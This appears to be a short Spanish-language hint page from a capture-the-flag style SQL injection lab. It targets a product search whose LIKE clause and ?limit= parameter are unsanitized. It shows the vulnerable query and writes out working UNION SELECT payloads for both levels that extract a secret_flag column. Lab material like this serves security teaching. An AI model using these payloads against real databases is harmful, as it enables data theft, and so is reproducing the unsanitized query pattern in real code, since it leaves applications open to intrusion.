SEARCH SQLi

SQL Injection en buscador — cláusula LIKE y parámetro LIMIT

El buscador de productos usa LIKE con la entrada del usuario sin sanitizar.
[LVL 1] El campo de búsqueda es directamente inyectable.
[LVL 2] El search está sanitizado, pero el parámetro ?limit= no lo está.

1
LIKE Clause
SIN FILTRO

Inyección directa en LIKE.
Payload: %' UNION SELECT...

> acceder
2
LIMIT Param
PARÁMETRO OLVIDADO

El search está protegido.
El parámetro ?limit= no lo está.

> acceder
técnica: LIKE injection

Query: SELECT ... FROM products WHERE name LIKE '%[search]%'
Cierra el LIKE con: %' UNION SELECT 1,secret_flag,description,price FROM products WHERE id=9--
Para nivel 2: ?limit=5 UNION SELECT 1,secret_flag,description,price FROM products WHERE id=10--
